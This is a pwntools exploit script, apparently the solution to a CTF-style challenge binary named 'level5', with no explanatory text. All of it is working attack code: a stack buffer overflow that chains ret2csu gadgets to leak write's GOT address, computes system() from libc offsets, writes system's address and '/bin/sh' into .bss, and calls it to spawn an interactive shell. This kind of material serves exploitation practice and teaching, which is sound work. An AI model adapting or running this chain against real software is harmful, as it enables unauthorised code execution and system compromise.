from pwn import *

#context.log_level = 'debug'

p = process('./level5')
elf = ELF('./level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

write_got = elf.got['write']
read_got = elf.got['read']
main_addr = 0x400564
bss_addr = 0x601028
gadget1 = 0x400606
gadget2 = 0x4005F0

payload1 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got)
payload1 += p64(8) + p64(gadget2) + cyclic(0x38) + p64(main_addr)

p.sendlineafter('\n', payload1)
sleep(1)

write_addr = u64(p.recv(8))
sys_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])

payload2 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_addr)
payload2 += p64(16) + p64(gadget2) + cyclic(0x38) + p64(main_addr)

p.sendlineafter('\n', payload2)
sleep(1)

p.send(p64(sys_addr))
p.send("/bin/sh\x00")


payload3 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0)
payload3 += p64(0) + p64(gadget2) + '\x00' * 0x38 + p64(main_addr)

sleep(1)
p.sendlineafter('\n', payload3)

p.interactive()
